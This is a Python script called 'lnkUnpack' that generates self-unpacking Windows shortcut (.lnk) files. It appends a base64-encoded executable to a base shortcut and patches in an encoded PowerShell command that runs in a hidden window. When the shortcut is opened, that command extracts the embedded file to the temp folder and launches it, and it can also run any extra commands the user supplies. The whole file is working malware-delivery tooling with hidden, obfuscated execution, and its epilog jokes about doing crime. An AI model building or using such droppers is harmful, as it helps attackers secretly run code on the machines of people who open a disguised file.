import os
import base64
import struct
import argparse

def init_args():
    parser = argparse.ArgumentParser(
        prog='lnkUnpack',
        description='Payload generator for self unpacking LNK files',
        epilog='Be gay, do crime :)'
    )
    parser.add_argument('-f', '--filename',
                        help='The output lnk file name',
                        required=True)
    parser.add_argument('-p', '--payload',
                        help='The payload to embed',
                        required=True)

    parser.add_argument('-t', '--temp',
                        help='The temp file that is dropped to disk',
                        default='out.exe')

    parser.add_argument('-e', '--extra',
                        help='Any powershell commands to run after the base payload')

    return parser.parse_args()


if __name__ == '__main__':
    args = init_args()
    filename: str = args.filename
    if not filename.endswith('.lnk'):
        filename = filename + '.lnk'
    print('[+] Generating command')
    BASE = '''$b64 = @(Select-String -Pattern "aDuck" -Path .\{}).Line -replace 'aDuck';Set-Content $env:temp\{} -Encoding Byte -Value @([System.Convert]::FromBase64String($b64)); invoke-item $env:temp\{}'''
    command: str = BASE.format(filename, args.temp, args.temp)
    if args.extra:
        command += f'; {args.extra}'
    # print(command)
    print('[+] Reading base lnk file')
    try:
        with open("base.bin", 'rb') as f:
            contents: bytes = f.read()
    except FileNotFoundError:
        print('[*] Failed to open base.lnk')
        exit(0)

    print('[+] Reading payload')
    contents += b'\naDuck'
    try:
        with open(args.payload, 'rb') as f:
            payload: bytes = f.read()
    except FileNotFoundError:
        print('[*] Failed to open payload')
        exit(0)

    print('[+] Parsing lnk arg length')
    try:
        base = '-windowstyle hidden -e <REPLACE_ME>'
        newLen: int = len(base.replace('<REPLACE_ME>', base64.b64encode(command.encode('UTF-16-LE')).decode()))
        index: int = contents.find('-window'.encode('utf-16-le')) - 2
        lengthBin: bytes= contents[index: index + 2]
        length: int = struct.unpack('@H', lengthBin)[0]
        contents = bytearray(contents)
        contents[index:index + 2] = struct.pack('@H', newLen)
        contents = bytes(contents)
    except IndexError:
        print('[*] Failed to parse LNK file')
        exit()

    print('[+] Appending payload')
    contents = contents.replace('<REPLACE_ME>'.encode('UTF-16-le'), (base64.b64encode(command.encode('UTF-16-le')).decode().encode('UTF-16-le')))
    contents += base64.b64encode(payload)

    print(f'[+] Writing to {filename}')
    with open(filename, 'wb') as f:
        f.write(contents)